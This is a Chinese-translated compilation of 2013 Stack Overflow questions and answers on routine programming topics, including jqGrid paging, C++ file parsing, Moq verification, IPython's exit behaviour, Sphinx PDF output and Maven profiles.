                url: "../Hdlr.ashx?GetData",
                mtype: "POST",
               colNames: ['Id', 'Short Description', 'Long Description','', ''],
                colModel: [
                    { name: 'Id', index: 'Id', width: 50, align: 'left', editable: false },
                    { name: 'ShortDescription', index: 'ShortDescription', width: 200, align: 'left', sortable: true, editable: true, edittype: 'text', editrules: { required: true } },
                    { name: 'LongDescription', index: 'LongDescription', width: 200, align: 'left', sortable: true, editable: true, edittype: 'text', editrules: { required: true } },
                    { name: 'edit', width: 30, sortable: false, formatter: 'actions', formatoptions: { keys: true, editformbutton: true, delbutton: false, editbutton: false } },
                    { name: 'delete', width: 30, sortable: false, formatter: 'actions', formatoptions: { keys: true, editformbutton: false, delbutton: true, editbutton: false } }],
                postData: {
                    Category: function () { return $("#Category").val(); }
                },
                jsonReader: {
                    cell: "",
                    id: "0"
                },
                pager: '#pager',
                rowNum: 10,
                rowList: [10, 20, 50],
                rownumbers: true,
                sortname: 'Id',
                sortorder: "asc",
                viewrecords: true,
                caption: 'MY GridInformation'
            }).jqGrid("navGrid", "#pager", { edit: false, add: false, del: false, search: false });
        } 
```

寻呼机不适用于 jqGrid 的这种简单声明。请帮忙

```
 $(function () {
            $("#list").jqGrid({
                url: "../Hdlr.ashx?method=GetData",
             mtype: 'POST',
                colNames: ['Id', 'Category', 'ShortDescription', 'LongDescription'],
                colModel: [
                    { name: 'Id', index: 'Id', width: 50, align: 'left', editable: false },
                    { name: 'Category', index: 'Category', width: 100, align: 'left', sortable: true },
                    { name: 'ShortDescription', index: 'ShortDescription', width: 200, align: 'left', sortable: true },
                    { name: 'LongDescription', index: 'LongDescription', width: 200, align: 'left', sortable: true }],
            jsonReader: {
                    cell: "",
                    id: "0"
                },
                pager: '#pager',
                rowNum: 10,
                rowList: [10, 20, 50],
                rownumbers: true,
              viewrecords: true,
                caption: 'Caption'
            }).jqGrid("navGrid", "#pager", { edit: false, add: false, del: false, search: false });
        });

    $.extend($.jgrid.edit, {
            editData: { Category: function () { return $("#Category").val(); } },
            url: '../Hdlr.ashx?SaveData',
            closeOnEscape: true,
            reloadAfterSubmit: true,
            closeAfterEdit: true,
            viewPagerButtons: false,
            });

I have removed edit and add options. The pager on grid is not working
<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" runat="server">
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="FeaturedContent" runat="server">
     <link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/redmond/jquery-ui.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="../Content/ui.jqgrid.css" type="text/css" />
    <script src="http://ajax.aspnetcdn.com/ajax/jquery/jquery-1.7.2.min.js"></script>
    <script src="http://ajax.aspnetcdn.com/ajax/jquery.ui/1.8.20/jquery-ui.min.js"></script>
    <script type="text/javascript" src="../Scripts/grid.locale-en.js"></script>
    <script type="text/javascript" src="../Scripts/jquery.jqGrid.min.js"></script>

    <script type="text/javascript">
        $.jgrid.no_legacy_api = true;
        $.jgrid.useJSON = true;
    </script>
  <script type="text/javascript" src="../Scripts/Common.js"></script>

    <script type="text/javascript">
        $(function () {
            "use strict";

            $("#list").jqGrid({
                url: "../Hdlr.ashx?method=GetData",
                mtype: 'POST',
                colNames: ['Id'],
                colModel: [{ name: 'id', index: 'id', width: 500}],
                jsonReader: {cell: "0"},
                pager: '#pager',
                rowNum: 10,
                rowList: [10, 20, 50],
                caption: 'Grid Information'
            }).jqGrid("navGrid", "#pager", { edit: false, add: false, del: false, search: false });
        });
        </script>
</asp:Content>
<asp:Content ID="Content3" ContentPlaceHolderID="MainContent" runat="server">
      <table id="list">
                </table>
                <div id="pager"></div>
</asp:Content>

    enter code here 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:08:30.523

例如，您可以构建自己的编辑函数，而不是扩展 jqGrid 设置，以便在连续按下按钮时调用。

```
function EditCollectionItem (rowid, grid){

    $(grid).jqGrid('editGridRow', rowid,
    {
        viewPagerButtons: false,
        editData: { ValueName: value },
        afterShowForm: function (formid) {
            //dostuff here if you wish, ex make a field have focus
        }, //afterShowForm
        afterComplete: function (response) {
          //deal with how the edit went
        } //afterComplete
    }); //$this.jqGrid('editGridRow

}//function EditCollectionItem (rowid, grid){ 
```

您可以在此处设置所有其他编辑选项，与您在原始代码中扩展它们的位置相同。

# c++ - 如何允许在文本文件中丢失数据

> ID：15879252
> 
> 赞同：0
> 
> 时间：2013-04-08T12:39:28.627
> 
> 标签：c++, vector, double

我有一个包含大量数据集的大文件，尽管标记为“--”，但仍有一些空白，无论出于何种原因，数据都没有被记录。其余数据将在向量中以双精度形式存储，我的问题是如何获取丢失的数据并将这些丢失的数据存储为零？我的数据文件的片段；

```
0    29.1     ---
0    65.9     ---
2    56.5     ---
6    19.7    44.3
9    69.8    64.9
11   118.6   64.8
7    35.7    64.1

if (myfile.is_open())
  {
    int count = 0;
    while ( myfile.good() )
    {
      getline (myfile,line);
      /*if (line == "---")
        {
        sun(0.0);
        }*/
      if (count > 6) 
      {

      std::istringstream buffer(line);
            int month;
            double  rain, sun;
            if (buffer >> month >> rain >> sun)
            {
                Weather objName = {month, rain, sun};
                data_weather.push_back(objName);       
            }
      }
      count++;
    }
    myfile.close(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:41:30.770

将数据作为字符串一次读取一行。检查它是否是“--”。如果是，则相同的 0.0，如果不是，则转换为双精度并保存双精度。

```
string line;
while (getline(file, line))
{
    if (line == "--")
    {
        save(0.0);
    }
    else
    {
        istringstrleam buf(line);
        double value;
        if (buf >> value)
        {
            save(value);
        }
        else
        {
            error("could not convert value");
        }
    }
} 
```

我正在使用 istringstream 进行从字符串到双精度的转换。

**更新**

根据问题中有关文件格式的新信息，以下应该可以工作（但它是未经测试的代码）。

```
string line;
while (getline(file, line))
{
    if (count > 6)
    {
        int month;
        double rain, sun;
        std::string sun_as_string;
        std::istringstream buffer(line);
        if (buffer >> month >> rain >> sun_as_string)
        {
            if (sun_as_string == "--")
            {
                sun = 0.0;
            }
            else
            {
                std::istringstream buffer2(sun_as_string);
                if (!(buffer2 >> sun))
                {
                    // couldn't convert the sun value, so just set to zero
                    sun = 0.0;
                }
            }
            Weather objName = {month, rain, sun};
            data_weather.push_back(objName);       
        }

    }
    ++count;
} 
```

基本思路和之前一样，将 sun 值读取为字符串，如果不是“--”，则仅将其转换为双精度值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:44:19.063

我将给出一个稍微不同的替代方案，它不会明确检查该行是否为`--`，它只是认为它不是有效的`float`.

您可以简单地使用 一次读出每一行`std::getline`，这只会在您到达文件末尾时停止。您可以尝试从每一行提取到您已初始化为的`float`（或） 。如果提取失败，该值仍将为.`double``0``0`

```
std::string line;
while (std::getline(file, line)) {
  std::istringstream ss(line);
  float f = 0.0f;
  ss >> f;
  results.push_back(f);
} 
```

# magento - Magento 在 getCollection() 中设置 AS

> ID：15879257
> 
> 赞同：0
> 
> 时间：2013-04-08T12:39:40.170
> 
> 标签：magento, collections

我有这个功能：

```
protected function _prepareCollection()
    {
        $collection = Mage::getResourceModel($this->_getCollectionClass());
        $collection->getSelect()->join('sales_flat_invoice', 'main_table.entity_id = sales_flat_invoice.order_id',array('increment_id'));
        $this->setCollection($collection);
        return parent::_prepareCollection();
    } 
```

increment_id 已经存在，所以当我手动运行脚本时，我得到 2 列名称：“increment_id”，所以我想从第二个 $collection 中命名 increment_id。

我试过了：`$collection->getSelect()->join('sales_flat_invoice', 'main_table.entity_id = sales_flat_invoice.order_id',array('increment_id AS increment_id2'));`但这不起作用:-(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:01:56.883

尝试这样的事情（尚未测试）

```
$collection->getSelect()->join(
    array("sfi"=>'sales_flat_invoice'), 
    'main_table.entity_id = sfi.order_id',
    'sfi.increment_id AS increment_id2'); 
```

来自[http://prattski.com/2010/10/21/magento-collection-join-does-not-allow-table-aliases/](http://prattski.com/2010/10/21/magento-collection-join-does-not-allow-table-aliases/)

# java - ClassNotFoundException：twitter4j.conf.PropertyConfigurationFactory：Android

> ID：15879259
> 
> 赞同：5
> 
> 时间：2013-04-08T12:39:42.287
> 
> 标签：java, android, twitter, proguard, classnotfoundexception

如果我不在我的项目上运行 pro-guard，一切都很好，但如果我运行 pro-guard 并在设备中安装 .apk，我会遇到错误。我尝试在`proguard-android.txt`文件中添加以下行

```
-keep public class twitter4j.conf.PropertyConfigurationFactory

-dontwarn twitter4j.** 
```

但这没有任何区别。

我正在使用`proguard-android.txt`来自的默认文件`SDK`

并将其设置`project.properties`如下

```
proguard.config=${sdk.dir}/tools/proguard/proguard-android.txt:proguard-project.txt 
```

我查看了[此](http://translate.google.co.in/translate?hl=en&sl=ko&u=http://www.androidpub.com/2198167&prev=/search?q=java.lang.ClassNotFoundException%3a%2btwitter4j.conf.PropertyConfigurationFactory%2bandroid&hl=en&biw=1366&bih=665&sa=X&ei=vrFiUeHWHoWrrAepl4HoBA&sqi=2&ved=0CG0Q7gEwCQ)链接以解决相同的问题，但无法理解，并且谷歌搜索对我没有太大帮助。

那么，有人可以告诉我这里有什么问题吗？

提前致谢

**编辑 ：**

删除限定符后出现 Logcat 错误`public`：

```
04-18 12:05:25.425: E/AndroidRuntime(16405): FATAL EXCEPTION: main
04-18 12:05:25.425: E/AndroidRuntime(16405): java.lang.ExceptionInInitializerError
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.b.a.h.<init>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.ap.a(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.ap.<init>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.aq.<init>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.al.<init>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.ao.a(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.ao.a(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at com.mobinius.creativepad.c.f.<init>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at com.mobinius.creativepad.c.a.<init>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at com.mobinius.creativepad.android.OpenScreenActivity.e(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at com.mobinius.creativepad.android.OpenScreenActivity.onClick(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at android.view.View.performClick(View.java:4232)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at android.view.View$PerformClick.run(View.java:17298)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at android.os.Handler.handleCallback(Handler.java:615)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at android.os.Handler.dispatchMessage(Handler.java:92)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at android.os.Looper.loop(Looper.java:137)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at android.app.ActivityThread.main(ActivityThread.java:4921)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at java.lang.reflect.Method.invokeNative(Native Method)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at java.lang.reflect.Method.invoke(Method.java:511)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1038)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:805)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at dalvik.system.NativeStart.main(Native Method)
04-18 12:05:25.425: E/AndroidRuntime(16405): Caused by: java.lang.AssertionError: java.lang.NoSuchMethodException: <init> [interface twitter4j.b.a.d]
04-18 12:05:25.425: E/AndroidRuntime(16405):    at twitter4j.b.a.e.<clinit>(Unknown Source)
04-18 12:05:25.425: E/AndroidRuntime(16405):    ... 22 more
04-18 12:05:25.425: E/AndroidRuntime(16405): Caused by: java.lang.NoSuchMethodException: <init> [interface twitter4j.b.a.d]
04-18 12:05:25.425: E/AndroidRuntime(16405):    at java.lang.Class.getConstructorOrMethod(Class.java:460)
04-18 12:05:25.425: E/AndroidRuntime(16405):    at java.lang.Class.getConstructor(Class.java:431)
04-18 12:05:25.425: E/AndroidRuntime(16405): 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T00:28:12.823

该类不是公开的，因此您应该删除 -keep 选项中的“public”关键字，否则模板将不匹配。

# c# - 使用 Moq，我如何将输入参数设置为具有预期属性值的对象的方法调用？

> ID：15879260
> 
> 赞同：39
> 
> 时间：2013-04-08T12:39:43.077
> 
> 标签：c#, unit-testing, tdd, moq

```
 var storageManager = new Mock<IStorageManager>(); 
 storageManager.Setup(e => e.Add(It.IsAny<UserMetaData>())); 
```

Add() 方法需要一个具有 FirstName 属性的 UserMetaData 对象。

我想确保已经传递了 FirstName 为“FirstName1”的 UserMetaData 类型的对象。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2013-04-08T12:51:55.007

您可以使用`Verify`.

**例子：**

验证`Add`从未使用`UserMetaData`with `FirstName`!=调用过`"FirstName1"`：

```
storageManager.Verify(e => e.Add(It.Is<UserMetaData>(d => d.FirstName!="FirstName1")), Times.Never()); 
```

使用with ==验证`Add`至少调用了一次：`UserMetaData``FirstName``"FirstName1"`

```
storageManager.Verify(e => e.Add(It.Is<UserMetaData>(d => d.FirstName=="FirstName1")), Times.AtLeastOnce()); 
```

验证使用==和==`Add`只调用过一次：`FirstName``"Firstname1"``LastName``"LastName2"`

```
storageManager.Setup(e => e.Add(It.Is<UserMetaData>(data => data.FirstName == "FirstName1"
                                                         && data.LastName  == "LastName2")));

...

storageManager.VerifyAll(); 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-04-08T12:52:59.850

您可以使用 It.Is 方法：

```
storageManager.Setup(e => e.Add(It.Is<UserMetaData>(data => data.FirstName == "FirstName1"))); 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-04-08T13:36:30.477

Dominic Kexel 的方法很好并且会奏效。如果您需要对更复杂的输出进行任何检查，您也可以使用回调。

```
 UserMetaData parameter = null;
 var storageManager = new Mock<IStorageManager>(); 
 storageManager
    .Setup(e => e.Add(It.IsAny<UserMetaData>()))
    .Callback((UserMetaData metaData) => parameter = metaData);

 Assert.That(parameter.FirstName, Is.EqualTo("FirstName1")); //If using fluent NUnit 
```

这样做的好处是，如果需要，您可以对参数进行更多检查，而不仅仅是检查它是否为“FirstName1”。

缺点是如果 Add 被多次调用，那么只会检查最后一次调用中传递的参数（尽管您可以另外验证它是否被调用过一次）。

对于您的确切情况，多米尼克的回答比我的要好，但我想指出其他类似情况的回调。

# python - 比较两个 gzip 文件的每第四行

> ID：15879264
> 
> 赞同：3
> 
> 时间：2013-04-08T12:39:58.157
> 
> 标签：python, gzip

我有 2 个 gzipped 文件，每个文件大约 1Gb。我想同时读取这两个文件并将两个文件的每第四行相互比较。有没有比这样更快的方法？

```
import gzip

file1 = r"path\to\file1.gz"
file2 = r"path\to\file2.gz"

for idx, (line1, line2) in enumerate(zip(gzip.open(file1), gzip.open(file2)), start=1):
    if not idx%4:
        compare(line1, line2) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:47:29.927

您仍然必须遍历这两个文件，但这更干净：

```
import gzip
from itertools import islice, izip

file1 = r"path\to\file1.gz"
file2 = r"path\to\file2.gz"

with gzip.open(file1) as f1, gzip.open(file2) as f2:
    for line1, line2 in islice(izip(f1, f2)), 3, None, 4):
        compare(line1, line2) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T12:48:27.447

您可以使用`itertools.islice(iterable, 3, None, 4)`来遍历`iterable`.

如果您使用的是 Python 2.x，请使用`itertools.izip`而不是`zip`避免读取内存中的所有内容。

# iphone - 如何使用 Objective-C 为两个视图设置动画

> ID：15879266
> 
> 赞同：3
> 
> 时间：2013-04-08T12:40:03.287
> 
> 标签：iphone, ios, objective-c

我需要使用 ObjectiveC 开发示例动画应用程序。

我在两个不同的 UiView 上有两个按钮。一个视图包含配置文件按钮，另一个视图包含设置按钮，当单击配置文件按钮视图时，它会自动增加其宽度和高度，设置按钮视图也会改变位置。反之亦然。

请在下面找到图片![在此处输入图像描述](https://i.stack.imgur.com/sz10d.jpg)

请帮助我，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:47:18.170

我相信你想要的是一个可折叠的 UITableView，苹果在这里有一个很好的例子：

[表视图更新](http://developer.apple.com/library/ios/#samplecode/TableViewUpdates/Introduction/Intro.html)

否则，您需要做的就是修改此块中方法内的框架，如下所示：

```
 [UIView animateWithDuration:1.0 animations:^{
                    myView.frame = newFrame
                }]; 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:48:18.060

你可以这样做：

当按下向下按钮以查看个人资料时，请执行以下操作：

```
[UIView animateWithDuration:1 delay:0 options:UIViewAnimationOptionCurveEaseOut animations:^{
        [profileView setFrame:CGRectMake(profileView.frame.origin.x, profileView.frame.origin.y, profile.frame.size.width, finalHeight)];
        [settingsView setFrame:CGRectOffset(settingsView.frame, 0, final_Y_Coordinate)];

    }completion:^(BOOL finished){
    }]; 
```

所以这基本上，做的是，它增加了剖面图的高度，同时改变了设置视图的 Y 坐标。

你可以对 settingsView 做同样的事情，只有 settingsView 的高度发生变化。

希望能帮助到你！

# python - 为什么 exit() 在 readlines 循环中不能立即终止程序？

> ID：15879267
> 
> 赞同：2
> 
> 时间：2013-04-08T12:40:05.197
> 
> 标签：python, ipython, readlines

我的程序的一部分是：

```
f = open('test.txt')
for line in f.readlines():
    print 'test'
    exit() 
```

为什么第一次遇到出口不能立即退出程序？相反，我的程序将在循环完成时退出。

## 编辑

它发生在交互模式下：

```
In [1]: f = open('test.txt', 'r')

In [2]: for line in f.readlines():
   ...:     print 'test'
   ...:     exit()
   ...:     
test
test
test
test
test
test 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T12:44:18.023

`exit`IPython 中的函数与`exit`Python 中的函数不同。在 IPython 中，`exit`是一个实例`IPython.core.autocall.ExitAutocall`：

```
In [6]: exit?
Type:       ExitAutocall
String Form:<IPython.core.autocall.ExitAutocall object at 0x9f4c02c>
File:       /data1/unutbu/.virtualenvs/arthur/local/lib/python2.7/site-packages/ipython-0.14.dev-py2.7.egg/IPython/core/autocall.py
Definition: exit(self)
Docstring:
An autocallable object which will be added to the user namespace so that
exit, exit(), quit or quit() are all valid ways to close the shell.
Call def:   exit(self)

In [7]: type(exit)
Out[7]: IPython.core.autocall.ExitAutocall 
```

它的定义如下所示：

```
class ExitAutocall(IPyAutocall):
    """An autocallable object which will be added to the user namespace so that
    exit, exit(), quit or quit() are all valid ways to close the shell."""
    rewrite = False

    def __call__(self):
        self._ip.ask_exit() 
```

该`self._ip.ask_exit()`调用运行此方法：

```
def ask_exit(self):
    """ Ask the shell to exit. Can be overiden and used as a callback. """
    self.exit_now = True 
```

所以它实际上并没有退出 IPython，它只是在控制返回到 IPython 提示符时设置一个退出标志。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-08T12:42:37.870

它对我来说很好：

```
sandbox $ wc -l test.tex
       9 test.tex
sandbox $ python test.py | wc -l
       1 
```

所以这可能不是你的*实际*代码。

但是，有几个原因可能会让您认为自己没有退出。 `file.readlines()`将所有行存储在列表中。进一步`file.read*`的行为就像你已经到达文件的末尾（因为你有！）。

要逐行遍历文件，请使用成语：

```
for line in f:
    do_something_with(line) 
```

或者，使用`sys.exit`. “内置”`exit`功能实际上仅[用于交互使用](http://docs.python.org/2/library/constants.html#exit)。（事实上​​，根据文档，它根本不是“内置”，所以你绝对可以使用不同的 python 实现从中获得有趣的行为）。

# python - 从单个 Sphinx 配置生成多个不同 pdf 的任何方式

> ID：15879276
> 
> 赞同：3
> 
> 时间：2013-04-08T12:40:31.313
> 
> 标签：python, pdf, python-sphinx

我有一个很好的关于项目的 Sphinx 文档，我想扩展它以生成诸如规范等文档。我想`spec-for-foo.rst`生成`spec-for-foo.pdf`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T12:40:31.313

解决方案是编辑`latex_documents`sphinx`conf.py`文件中的条目，该条目包含由`latex`.

此配置条目包含一个 touples 列表，其中包含：（源文件、目标 tex 文件、文档标题、作者和文档类：

```
latex_documents = [
   ('index', 'Kaskady.tex', u'Kaskady  Documentation',
    u'Author', 'manual'),
   ('profile', 'profiles.tex', u'Wyznaczanie profili', 
    u'Author', 'howto'),
] 
```

# c# - 网络服务参考

> ID：15879279
> 
> 赞同：0
> 
> 时间：2013-04-08T12:40:32.483
> 
> 标签：c#, web-services, app-config

我有一个解决方案，其中包含许多项目。驻留在主解决方案中的三个项目中有 Web 服务调用。这些 Web 服务项目 (.dll) 出去，抓取一些数据，然后返回（正常运行）。然后他们处理数据，并将其呈现给主应用程序（解决方案中的另一个项目）。

每个项目都有自己的 app.config 文件，该文件设置对公开 Web 服务位置的引用，并且引用设置为动态。

我不分发项目的 .config 文件，只分发解决方案中的主项目。

我的问题，经过长时间的描述是这样的......

其他项目能看到和使用主应用的app.config吗？

我想做的是使用单个 app.config，并让所有项目引用该 ONE app.config 文件以获取公开的 Web 服务的位置。

这可以实现吗？

附带问题....如果我不为解决方案中的其他项目分发 app.config dll，他们怎么知道暴露的 Web 服务的位置？

第三个问题 - 如果我将其他项目 app.config 与解决方案一起分发，这些项目会引用附加的 app.config dll，还是会忽略它，并使用硬编码（在构建时）引用？

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:47:25.577

`Can the other projects see and use the app.config of the main application`

是的。一般来说，如果主项目引用其他项目，我认为它必须，那么当您构建和部署主项目时，该项目的 app.config 文件中指定的 app.config 设置将用于配置引用其他项目。

`if i do not distribute the app.config dlls for the other projects in the solution, how do they know know the location of the exposed web services?`

因为您已经在主项目的 app.config 中指定了它们。

`if i distribute the other projects app.config with the solution, will the projects reference the attached app.config dll, or will they ignore it, and use the hard coded (at build time) references?`

他们应该在运行时使用 app.config 中指定的设置。

# image-processing - “灰度频率计数的方差”和“所有像素值的方差”之间有什么区别

> ID：15879282
> 
> 赞同：0
> 
> 时间：2013-04-08T12:40:38.050
> 
> 标签：image-processing, statistics

我读了一些关于质量评估的文章，其中提出的技术之一是将图像分为三类。“光滑”“纹理”和“边缘”。文章告诉我们应该计算这些特征的方差。我不知道这两者之间的区别。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T14:11:01.347

虽然这对于 SO 来说并不是一个真正的好问题，因为它与编程无关。我可以尝试回答给你一个指导，并建议你在另一个网站上寻找更多信息。例如[dsp.stackexchange.com](https://dsp.stackexchange.com/)

“灰度频率计数的方差”实际上是图像灰度直方图的方差。这可以指示图像中存在不同强度级别的方式，但没有说明这些灰度级别的位置，尽管双模（或多模）直方图确实表明某些“特征”的存在种类。

“所有像素值的方差”是图像本身的方差，不是一回事。这给出了图像纹理的指示，因为高方差表示大量边缘（即高频内容），而低方差表示“更平滑”的纹理。所以这个度量*取决于*像素的位置以及它们的灰度级。

看看[这个相关的问题](https://stats.stackexchange.com/q/30064)，它给出了一些很好的差异示例。

# joomla - 左栏为空时的Joomla 2.5条件

> ID：15879289
> 
> 赞同：0
> 
> 时间：2013-04-08T12:40:54.717
> 
> 标签：joomla, conditional-statements

通常我使用 TYPO3。但现在我收到了一个 Joomla 2.5 CMS 的请求。左列包含一个子菜单。但也有只有一页的菜单条目。

如果没有子菜单，我想将内容从中间移到左侧。

有条件解决这个问题吗？

问候英戈

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T21:28:09.150

在模板文件中，您可以使用`if($this->countModules("position-7"){do some stuff}`. 这将检查是否为模块位置“位置 7”设置了活动模块。

这使您可以在模板中做各种有趣的事情。只需检查您需要的位置，如果有要显示的模块，则仅显示整个侧边栏。

# windows-8 - Backgroundtask.js - 如何包含其他文件

> ID：15879290
> 
> 赞同：0
> 
> 时间：2013-04-08T12:40:57.110
> 
> 标签：windows-8, winjs

我已经开始使用时间触发器，并在 bacvkgroundtask.js 中定义了我的任务。现在我有一个简单的，也许是愚蠢的问题：

*   我应该如何包含外部文件？

通常我们在 html 文件中执行此操作，但在这种情况下，任务的入口点只是一个 javascript 文件。

编辑：这是创建我需要将其他文件“导入”到的 backgroundtask.js 文件的 msdn 示例的链接。[http://msdn.microsoft.com/en-us/library/windows/apps/hh977045.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/hh977045.aspx)

谢谢

拉尔西

# r - 调整窗口大小并将边距设置为最小值

> ID：15879293
> 
> 赞同：4
> 
> 时间：2013-04-08T12:41:05.880
> 
> 标签：r, igraph

我正在尝试创建一个树形图，并且由于“父亲”有很多“孩子”，我希望它是一个非常宽的图表。因此，我尝试使用 windows 选项调整窗口大小并将边距设置为零宽度，以便获得宽图形。这些是我的程序行：

```
windows(heigth=7, width=14, record=TRUE, rescale="fit")
par(mar=c(1,0,1,0), omi=c(0,0,0,0), oma=c(0,0,0,0))
plot(graph_name,layout=layout.reingold.tilford(tree)) 
```

我得到了一个宽阔的设备窗口，但情节在中间并且没有广泛传播。我在做什么错？

提前致谢，

诺姆

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T13:47:45.107

默认情况下，`igraph`无论设备大小如何，都使用方形纵横比。`asp`您可以通过将参数设置为 来禁用此功能`0`。

```
library(igraph)
g <- barabasi.game(100)
par(mar=c(0,0,0,0))
plot(g, asp=0) 
```

# maven - Maven、Artifactory 和 Jenkins 环境中各种 maven 配置文件（jboss、tomcat、glassfish）的不同数据库库名称（工件）

> ID：15879294
> 
> 赞同：0
> 
> 时间：2013-04-08T12:41:15.497
> 
> 标签：maven, tomcat, jboss, jenkins, artifactory

我们配置了 CI Jenkins 作业以构建各种 Maven 配置文件。每个编译的库都会根据其版本进入 Artifactory libs-release 或 libs-snapshots 虚拟存储库。

现在我们遇到了如何为“Jboss”和“Tomcat”配置文件配置构建的问题。这两个配置文件中的每一个都将为每个配置文件（jboss 或 tomcat）生成具有完全相同名称的数据库库。如何组织/配置环境以区分每个环境（jboss 或 tomcat）的这些库？更简单地说...如何从 Artifactory 的远程存储库中了解每个配置文件中哪个库/工件是正确的？

希望你理解这个问题:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T06:14:58.867

[Maven 配置文件](http://maven.apache.org/guides/introduction/introduction-to-profiles.html)来救援。在生产方面，您需要[根据 profile 设置不同的分类器](https://stackoverflow.com/questions/4196569/change-deployed-artifact-name-based-on-profile)。在消费端，您需要根据配置文件定义不同的依赖项。在 Jenkins 中，您将通过在作业配置的“目标和选项”文本字段中指定 -p 来运行正确的配置文件。

# microsoft-metro - WinJS listview 进度条

> ID：15879301
> 
> 赞同：2
> 
> 时间：2013-04-08T12:41:29.193
> 
> 标签：microsoft-metro, winjs

## WinJS listview 进度条

嗨，我正在使用 WinJS 应用程序。我有一个列表视图。我需要在加载列表视图时添加一个进度条。如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T07:07:03.767

WinJS ListView 控件已经包含一个进度环，当 listView 获取数据时会显示该进度环。

一旦 listView 中的第一项被渲染，进度环就会消失。有关更多详细信息，请参阅此示例：http: [//code.msdn.microsoft.com/windowsapps/ListView-performance-39fb71f0](http://code.msdn.microsoft.com/windowsapps/ListView-performance-39fb71f0)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T14:01:42.413

按照@Sushil 的建议，手动创建进度控件并显示/隐藏 ListView，或者实现以异步方式返回数据的自定义[IListDataSource 。](http://msdn.microsoft.com/en-us/library/windows/apps/br211786.aspx)

在这种情况下，ListView 将在等待数据源时自行显示加载指示器。我建议采用这种方法，即使它的学习曲线可能稍微陡峭。此外，您可以在 ListView 的事件上注册事件侦听器`loadingstatechanged`以进行进一步处理。

# c++ - 二进制乘法器的 C++ 实现

> ID：15879303
> 
> 赞同：0
> 
> 时间：2013-04-08T12:41:31.477
> 
> 标签：c++

我正在尝试 32 位二进制乘法器的 C++ 实现。我只知道这样做的一种方法是

```
 1011   (this is 11 in decimal)      
x   1110   (this is 14 in decimal)      
   ======        
    0000   (this is 1011 x 0)       
   1011    (this is 1011 x 1, shifted one position to the left)      
  1011     (this is 1011 x 1, shifted two positions to the left)     
 1011      (this is 1011 x 1, shifted three positions to the left)   
=========    
10011010   (this is 154 in decimal). 
```

是否有另一种方法可以做到这一点，因为我必须对更长的二进制数进行操作，所以编码起来并不那么麻烦？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:53:34.160

好吧，任意精度和大数字的（正确和高效）实现**很**麻烦，并且对于在生产代码中使用，通常建议使用经过测试的框架（例如[boost](http://www.boost.org/doc/libs/1_53_0/libs/multiprecision/doc/html/index.html)、[gmp](http://gmplib.org/)等）。

但是，如果您自己实现它，我不会将数字存储为位序列，而是存储为机器字序列，`unsigned int`以便充分利用您的硬件 ALU 功能。因此，每个单词已经代表了许多位，并且您的 ALU 知道如何将它们相乘。

